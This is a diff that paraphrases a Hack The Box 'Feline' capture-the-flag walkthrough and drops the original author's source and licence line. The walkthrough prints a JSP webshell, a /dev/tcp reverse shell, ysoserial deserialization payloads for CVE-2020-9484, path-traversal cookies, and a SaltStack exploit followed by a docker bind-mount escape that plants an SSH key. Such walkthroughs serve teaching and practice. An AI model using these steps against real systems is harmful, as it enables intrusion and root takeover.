@@ -6,14 +6,14 @@ points: 40
 rating: 4.8
 date: 2020-08-29
 avatar: assets/htb/feline.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Feline
 ---
+
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked off enumeration by running nmap against `<YOUR_IP>`. My usual flags are: `-p-`, a shorthand that scans every port; `-sC`, which is the same as `--script=default` and fires nmap's default enumeration scripts at the host; `-sV` for service detection; and `-oA <name>` to write the results to files named `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/feline]
@@ -73,17 +73,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 29.91 seconds
 ```
 
-only two ports open, 22- SSH and 8080 - HTTP
+just two ports were exposed: 22 (SSH) and 8080 (HTTP)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-virusbucket.png)
+![](assets/wu/feline/img-1.png)
 
-HTTP had a website, VirusBucket for uploading and testing files for malware.
+The HTTP port served a site called VirusBucket, which let you upload files to be scanned for malware.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-fail-burp.png)
+![](assets/wu/feline/img-2.png)
 
-I tried uploading a PHP webshell, but got `File Upload failed` errors.  Burp told me that it was an invalid filename.
+My first attempt was to upload a PHP webshell, but it returned `File Upload failed` errors. Burp revealed the cause was an invalid filename.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-fail.png)
+![](assets/wu/feline/img-3.png)
 
 ```java
 <%@ page import="java.util.*,java.io.*"%>
@@ -121,19 +121,19 @@ if (request.getParameter("cmd") != null) {
 </BODY></HTML>
 ```
 
-Next, I tried uploading a `cmd.jsp` simple webshell from [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) 
+Next I uploaded a basic `cmd.jsp` webshell taken from [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-success.png)
+![](assets/wu/feline/img-4.png)
 
-and got a success message
+which returned a success message
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-success-burp.png)
+![](assets/wu/feline/img-5.png)
 
-Note: renaming the PHP files uploaded fixed the invalid filename error.  After some testing I found that filenames could not have `-` or `_` in them.  
+Note: renaming the uploaded PHP files cleared the invalid filename error. Through trial and error I worked out that filenames couldn't contain `-` or `_`.
 
-Unfortunately neither of these webshells gave me code execution as I hoped.
+Sadly, neither webshell gave me the code execution I was after.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-burp-pngerror.png)
+![](assets/wu/feline/img-6.png)
 
 ```text
 <div id="error">
@@ -184,19 +184,19 @@ Caused by: java.io.FileNotFoundException: /opt/tomcat/temp/upload_d4070743_9738_
 </div>
 ```
 
-Uploading a PNG file made it spit out a very verbose error message. I could see in the output the location the files were being uploaded to: `/opt/tomcat/temp/upload_d4070743_9738_4ba0_94f9_f5544ed1c26d_00000027.tmp`. This gave me a chance to try to execute code if directory traversal was not blocked
+Uploading a PNG triggered a highly verbose error. The output disclosed where files landed on disk: `/opt/tomcat/temp/upload_d4070743_9738_4ba0_94f9_f5544ed1c26d_00000027.tmp`. Knowing that path opened the door to code execution, provided directory traversal wasn't blocked
 
 ### CVE-2020-9484
 
-Googling the version of apache `Apache Tomcat 9.0.27` and "file upload" lead to pages that gave instructions for deploying a web app through a `.war` file....
+Searching for `Apache Tomcat 9.0.27` together with "file upload" turned up guides on deploying a web app via a `.war` file....
 
-according to [https://tomcat.apache.org/tomcat-9.0-doc/changelog.html](https://tomcat.apache.org/tomcat-9.0-doc/changelog.html) 9.0.41 is the newest version, so I thought that perhaps 9.0.27 had vulnerabilities.
+Per [https://tomcat.apache.org/tomcat-9.0-doc/changelog.html](https://tomcat.apache.org/tomcat-9.0-doc/changelog.html), 9.0.41 was the latest release, so I suspected 9.0.27 might carry known flaws.
 
 * [https://tomcat.apache.org/security-9.html\#Fixed\_in\_Apache\_Tomcat\_9.0.29](https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.29)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-cve1.png)
+![](assets/wu/feline/img-7.png)
 
-Found a vulnerability that had been fixed in version 9.0.35 that sounded very useful for getting remote code execution, which was given CVE number CVE-2020-9484.
+I found a bug patched in 9.0.35 that looked perfect for remote code execution, tracked as CVE-2020-9484.
 
 * [https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)
 * [https://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html](https://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html)
@@ -212,7 +212,7 @@ Found a vulnerability that had been fixed in version 9.0.35 that sounded very us
 bash -c "bash -I >& /dev/tcp/10.10.15.98/8990 0>&1"
 ```
 
-Downloaded the latest release of ysoserial and created my simple reverse shell script payload
+I grabbed the newest ysoserial build and wrote a simple reverse shell script as my payload
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/feline]
@@ -220,7 +220,7 @@ Downloaded the latest release of ysoserial and created my simple reverse shell s
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 ```
 
-Then followed the instructions to use ysoserial to create my malicious session file to deserialize
+Following the writeup, I used ysoserial to build the malicious session file to be deserialized
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/feline]
@@ -228,7 +228,7 @@ Then followed the instructions to use ysoserial to create my malicious session f
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 ```
 
-The next malicious session file was used to give execute permissions to the first payload
+The second session file granted execute permissions on the first payload
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/feline]
@@ -236,7 +236,7 @@ The next malicious session file was used to give execute permissions to the firs
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 ```
 
-The final malicious session file was used to execute my payload.sh reverse shell
+The last session file ran my payload.sh reverse shell
 
 ```bash
 #!/bin/bash
@@ -251,7 +251,7 @@ curl http://<YOUR_IP>:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples
 curl http://<YOUR_IP>:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/executePayload'
 ```
 
-Finally I wrote a script to automate uploading all of these files to the server. Next I ran `python3 -m http.server` so that the final payload could be downloaded, started a netcat listener, and then I ran the script and hoped that everything would work!
+Finally I scripted the upload of all these files to the server. I then started `python3 -m http.server` to host the final payload for download, brought up a netcat listener, and launched the script hoping it would all come together!
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/feline]
@@ -276,7 +276,7 @@ File uploaded successfully!
 </pre><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/9.0.27</h3></body></html>
 ```
 
-Each of the files were uploaded successfully, though they each threw a `HTTP Status 500 – Internal Server Error`, probably after deserializing the "session" it expected.
+Every file uploaded fine, yet each one returned `HTTP Status 500 – Internal Server Error`, most likely after the server deserialized the "session" it was tricked into loading.
 
 ## Initial Foothold
 
@@ -287,7 +287,7 @@ Serving HTTP on 0.0.0.0 port 9990 (http://0.0.0.0:9990/) ...
 <YOUR_IP> - - [13/Dec/2020 15:51:44] "GET /payload.sh HTTP/1.1" 200 -
 ```
 
-Got a connection to my http.server, sending my payload on its way
+My http.server received a hit, meaning the payload was being pulled down
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/feline]
@@ -308,7 +308,7 @@ nc -lvnp 8991aa:~/htb/feline$
 tomcat@VirusBucket:/opt/tomcat$ export TERM=xterm-256color
 ```
 
-I started logging output with the `script` command, started a bash shell \(since zsh seems to have problems with `stty raw -echo`\), then started my netcat listener. After running my `exploit.sh` I got a shell!
+I began recording output with the `script` command, dropped into a bash shell \(zsh tends to misbehave with `stty raw -echo`\), then fired up my netcat listener. Running `exploit.sh` landed me a shell!
 
 ### Enumeration as `tomcat`
 
@@ -332,7 +332,7 @@ udp        0      0 <YOUR_IP>:59415      1.0.0.1:53              ESTABLISHED -
 udp        0      0 127.0.0.53:53           0.0.0.0:*
 ```
 
-Netstat showed that there were a few more ports open internally that I didn't see from my machine. 53, 4505, 4506, 8000, and 8005
+Netstat exposed several ports listening locally that weren't visible externally: 53, 4505, 4506, 8000, and 8005
 
 ```text
 tomcat@VirusBucket:/dev/shm$ ip a
@@ -366,7 +366,7 @@ tomcat@VirusBucket:/dev/shm$ ip a
        valid_lft forever preferred_lft forever
 ```
 
-There was a docker container hosted
+A docker container was running on the host
 
 ### user.txt
 
@@ -387,7 +387,7 @@ tomcat@VirusBucket:~$ cat user.txt
 a26d************************ed37
 ```
 
-The user `tomcat` ended up being the user with the `user.txt` flag!
+As it turned out, the `tomcat` user held the `user.txt` flag!
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -432,14 +432,14 @@ tomcat:x:1000:1000::/home/tomcat:/bin/bash
 dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 ```
 
-only `tomcat` and `root` could log in with a shell
+only `tomcat` and `root` had a login shell
 
 ```text
 tomcat@VirusBucket:/dev/shm$ curl --max-time 2 --unix-socket /run/snapd.socket http://index
 {"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
 ```
 
-linpeas.sh showed that the socket `/run/snapd.socket` could be communicated with, so I validated it. Since this socket was owned by root this could be a possible privesc method
+linpeas.sh flagged that the `/run/snapd.socket` socket was reachable, so I confirmed it by hand. Because root owned that socket, it looked like a potential privesc route
 
 [https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection](https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection)
 
@@ -467,11 +467,11 @@ Connection: close
 400 Bad Request
 ```
 
-This socket did not seem to be vulnerable to this kind of injection
+The socket didn't appear susceptible to that style of injection
 
 ### CVE-2020-16846
 
-Next I looked closer at the ports that were open internally. `SaltStack` uses ports 4505 and 4506 for its Salt master
+I then took a closer look at the internally exposed ports. `SaltStack` uses ports 4505 and 4506 for its Salt master
 
 * [https://docs.saltstack.com/en/getstarted/system/communication.html](https://docs.saltstack.com/en/getstarted/system/communication.html#:~:text=The%20Salt%20master%20uses%20ports%204505%20and%204506%2C,which%20must%20be%20opened%20to%20accept%20incoming%20connections)
 
@@ -479,7 +479,7 @@ Next I looked closer at the ports that were open internally. `SaltStack` uses po
 >
 > Request Server \(port 4506\) Salt minions connect to the request server as needed to send results to the Salt master, and to securely request files and minion-specific data values \(called Salt pillar\). Connections to this port are 1:1 between the Salt master and Salt minion \(not asynchronous\).
 
-I did not see a salt user so it was possible that this might be running as `root`
+There was no dedicated salt user, which hinted the service might be running as `root`
 
 * [https://us-cert.cisa.gov/ncas/current-activity/2020/05/01/saltstack-patches-critical-vulnerabilities-salt](https://us-cert.cisa.gov/ncas/current-activity/2020/05/01/saltstack-patches-critical-vulnerabilities-salt)
 * [https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/](https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/)
@@ -493,7 +493,7 @@ I did not see a salt user so it was possible that this might be running as `root
 
 links to metasploit module: [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/saltstack\_salt\_api\_cmd\_exec.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/saltstack_salt_api_cmd_exec.rb)
 
-This module would require the port to be open from the outside, so I decided to make an SSH tunnel to give it a target to connect to. Unfortunately, `tomcat`'s user folder was owned by root so I could not create a `.ssh` folder to inject my key. Instead, I uploaded chisel and made a tunnel with that.
+The module needed the port to be reachable externally, so I planned to set up an SSH tunnel to expose it. The catch was that `tomcat`'s home directory was owned by root, so I couldn't create a `.ssh` folder to drop in my key. Instead I uploaded chisel and built the tunnel with that.
 
 * [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
 
@@ -507,7 +507,7 @@ This module would require the port to be open from the outside, so I decided to 
 2020/12/13 17:22:16 server: Listening on http://0.0.0.0:9909
 ```
 
-First I created a server on my machine listening for reverse connections
+First I stood up a server on my box to accept reverse connections
 
 ```text
 tomcat@VirusBucket:/dev/shm$ wget http://10.10.15.98:8099/chisel
@@ -529,7 +529,7 @@ tomcat@VirusBucket:/dev/shm$ ./chisel client 10.10.15.98:9909 R:8000:127.0.0.1:8
 2020/12/13 22:36:41 client: Connected (Latency 37.60698ms)
 ```
 
-Then on the victim machine I downloaded chisel, made it executable, then created a reverse connection linking port 8000 on both machines \(this was the port the msfconsole exploit wanted\)
+On the target I downloaded chisel, marked it executable, and opened a reverse tunnel mapping port 8000 across both hosts \(the port the msfconsole exploit expected\)
 
 ```text
 msf6 exploit(linux/http/saltstack_salt_api_cmd_exec) > run
@@ -572,7 +572,7 @@ cd root
 [*] 127.0.0.1 - Command shell session 1 closed.
 ```
 
-for some reason executing some commands caused my connection to drop so I had to keep recreated the session
+for whatever reason, running certain commands killed my connection, so I had to keep re-establishing the session
 
 ```text
 cat /root/todo.txt
@@ -580,9 +580,9 @@ cat /root/todo.txt
 - Integrate changes to tomcat and make the service open to public.
 ```
 
-There was no `root.txt` in the /root folder, but there was a `todo.txt`
+The /root folder held no `root.txt`, but it did contain a `todo.txt`
 
-switching the payload to cmd/unix/python//// made it much more stable
+swapping the payload to cmd/unix/python//// made the session far more stable
 
 ```text
 echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8emG+VqFZL/N0w= kac0@kali' > authorized_keys
@@ -596,7 +596,7 @@ hostname
 2d24bf61767c
 ```
 
-AFter trying a number of times to put my ssh key into the authorized\_keys file and failing to log in, I realized that I was not on the host victim machine. I must be inside a VM or container...
+After repeatedly dropping my ssh key into authorized\_keys and still failing to log in, it dawned on me that I wasn't on the actual host. I had to be inside a VM or container...
 
 ```text
 root@2d24bf61767c:/# ip a
@@ -611,7 +611,7 @@ ip a
        valid_lft forever preferred_lft forever
 ```
 
-the interface eth0 had an ip of 172.. which was a docker IP...I felt like this had been a bit too easy!
+the eth0 interface carried a 172. address, a typical docker IP...this had felt a little too easy!
 
 ```text
 root@2d24bf61767c:~# cat .bash_history
@@ -650,7 +650,7 @@ curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
 exit
 ```
 
-the `root` user had a bash\_history file that hadn't been set to /dev/null, and contained a few interesting commands
+the container's `root` user had a bash\_history file that wasn't symlinked to /dev/null, and it held some interesting commands
 
 ```text
 root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
@@ -683,7 +683,7 @@ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
 ```
 
-I mimicked a few of the commands that were in the history to see if there were any clues
+I replayed a few of the commands from the history to look for clues
 
 ```text
 root@2d24bf61767c:~# cat /etc/shadow
@@ -710,7 +710,7 @@ _apt:*:18374:0:99999:7:::
 sshd:*:18385:0:99999:7:::
 ```
 
-from the command history I could see that root had set a password, so I copied the hash to my computer and tried to crack it...unsuccessfully
+the history showed root had set a password, so I pulled the hash to my machine and tried cracking it...with no luck
 
 * [https://docs.docker.com/engine/reference/commandline/exec/](https://docs.docker.com/engine/reference/commandline/exec/)
 
@@ -720,9 +720,9 @@ docker ps
 bash: docker: command not found
 ```
 
-the docker command was not installed in the container, but since it was in the host, I copied it over from other shell
+docker wasn't installed inside the container, but since the host had it, I copied the binary over from my other shell
 
-[https://docs.docker.com/storage/bind-mounts/](https://docs.docker.com/storage/bind-mounts/) using this I could mount the `/root` directory of the host machine to the container and then copy my ssh key over to enable login
+[https://docs.docker.com/storage/bind-mounts/](https://docs.docker.com/storage/bind-mounts/) this let me bind-mount the host's `/root` directory into the container so I could drop my ssh key in and enable login
 
 * [https://docs.docker.com/engine/reference/commandline/run/](https://docs.docker.com/engine/reference/commandline/run/)
 * [https://docs.docker.com/engine/reference/commandline/images/](https://docs.docker.com/engine/reference/commandline/images/)
@@ -734,7 +734,7 @@ docker ps
 bash: docker: command not found
 ```
 
-docker command not availble inside container
+docker command still not available inside the container
 
 ```text
 tomcat@VirusBucket:/usr/bin$ python3 -m http.server 9999
@@ -743,7 +743,7 @@ Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
 172.17.0.2 - - [13/Dec/2020 23:34:47] "GET /docker HTTP/1.1" 200 -
 ```
 
-Hosted python3 http.server from tomcat user in the `/usr/bin` folder
+As the tomcat user I served python3 http.server out of the `/usr/bin` folder
 
 ```text
 root@2d24bf61767c:~# wget http://172.17.0.1:9999/docker
@@ -759,7 +759,7 @@ docker              100%[===================>]  81.09M   334MB/s    in 0.2s
 2020-12-13 23:34:47 (334 MB/s) - ‘docker’ saved [85029616/85029616]
 ```
 
-downloaded the docker program to the container
+pulled the docker binary down into the container
 
 ```text
 root@2d24bf61767c:~# chmod +x docker
@@ -778,14 +778,14 @@ sandbox             latest              a24bb4013296        6 months ago        
 <none>              <none>              188a2704d8b0        7 months ago        1.06GB
 ```
 
-after some enumeration I was ready to craft my command to mount the filesystem
+with that enumeration done, I was ready to build the command to mount the filesystem
 
 ```text
 root@2d24bf61767c:~# ./docker run -v /root:/tmp -it sandbox:latest
 ./docker run -v /root:/tmp -it sandbox:latest
 ```
 
-I mounted `/root` from the host machine to `/tmp` in the container
+I bind-mounted the host's `/root` onto `/tmp` inside the container
 
 ```text
 / # ^[[28;5Rcd /tmp
@@ -815,7 +815,7 @@ AAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8e
 mG+VqFZL/N0w=' >> .ssh/authorized_keys
 ```
 
-I changed directories to `/tmp` in the container, which now mirrored `/root` on the host machine. I echoed my ssh key to `root`'s `authorized_keys` file, then tried to login with ssh
+I cd'd into `/tmp` in the container, which now reflected `/root` on the host. I appended my ssh key to `root`'s `authorized_keys` file and then attempted to log in over ssh
 
 ### Root.txt
 
